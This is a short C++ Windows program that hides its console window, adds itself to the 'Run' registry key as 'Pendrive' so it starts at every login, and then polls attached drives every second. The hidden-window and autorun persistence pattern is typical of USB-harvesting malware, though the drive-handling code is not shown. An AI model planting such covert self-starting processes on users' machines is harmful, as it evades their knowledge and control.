#include <time.h>
#include <cstdlib>

#include "sys/disk_info.h"
#include "sys/reg.h"

#include "helpers/system.h"

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
	// Registry values
	const wchar_t* regLocation = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	const wchar_t* regName = L"Pendrive";

	// Set app to background process
	HWND hiddenWindow;
	AllocConsole();
	hiddenWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hiddenWindow, 0);

	// Classes
	DiskInfo diskHandler;
	RegistryHandler regHandle;
	System sys;

	// Check registry value
	wchar_t* registryIsSet = regHandle.getRegistryValue(regLocation, regName);
	if (wcslen(registryIsSet) == 0) {
		regHandle.setRegistryValue(regLocation, sys.getPath(), regName);
	};

	// Main loop
	while (1) {
		diskHandler.getDrives();
		Sleep(1000);
	};

	return 0;
}
